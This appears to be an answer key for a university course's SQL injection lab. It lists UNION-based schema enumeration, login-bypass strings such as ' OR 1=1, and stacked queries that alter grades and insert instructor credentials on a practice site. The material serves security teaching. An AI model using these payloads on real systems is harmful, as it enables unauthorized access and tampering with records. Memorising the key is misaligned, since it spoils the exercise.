# SQL Injection Challenges SOLUTIONS

## 1. Use the INFO 310 site to see Alice's grade.

1. First, we need to find the name of the database:

```
' UNION SELECT 1,2,3,database();-- 
```
2. Next, we can find the name of all tables in this database:

```
' UNION SELECT 1,2,3,table_name FROM information_schema.TABLES WHERE table_schema='<database_name>';-- 
```

3. Now, we can look for the column names of the table of interest. This will allow us to search by elements other than student ID.

```
UNION SELECT 1,2,3,column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>';-- 
```
4. Finally, you can view a specific entry in the table based on a column variable.

```
' OR <column_name> = <variable>;-- 
```

---

## 2. Use the instructor portal to make an announcement as Dr. Reifers that class is cancelled on Wednesday.

1. We can log in as an instructor by entering their email and ending our query there. This will then allow us to login without a password.

```
<instructor email>';-- 
```

2. Enter any text for the password and you can login!

### OR

1. You can use the classic 1=1 injection in place of an email. This will allow you to login with the first credentials listed in the SQL table.

```
' OR 1=1;-- 
```

2. Enter any text for the password and you can login!

---

## 3. Change your grade in the gradebook to a 4.0.

1. Use can use `UPDATE` to change entries in a specific table:

```
UPDATE <gradebook> SET <column_name> = <value> WHERE <other_column_name> = <other_value>;-- 
```
### OR

1. Use `DELETE` to remove a current entry with a specific column value.

```
'); DELETE FROM <table_name> WHERE <column_name> = <value>;-- 
```

2. Now, you can use `INSERT` to add a new entry with your updated grade. Make sure you also add all the other appropriate variables for all columns in the table.

```
'); INSERT INTO <table_name> (<column_name_1>, <column_name_2>, <column_name_3>, <column_name_4>) VALUES (<value_1>, <value_2>, <value_3>, <value_4>);-- 
```

--- 

## 4. Give yourself instructor level privledges and make an announcement **as Bob** letting everyone know you hacked the INFO 310 website.

1. Find the column names for the login credential table the same way we did in the first challenge:

```
UNION SELECT 1,2,3,column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>';-- 
```

2. Use `INSERT` to add an entry with your own credentials:

```
'); INSERT INTO <table_name> (<column_name_1>, <column_name_2>, <column_name_3>) VALUES (<value_1>, <value_2>, <value_3>);-- 
```
3. Login with your newly created credentials and post an announcement!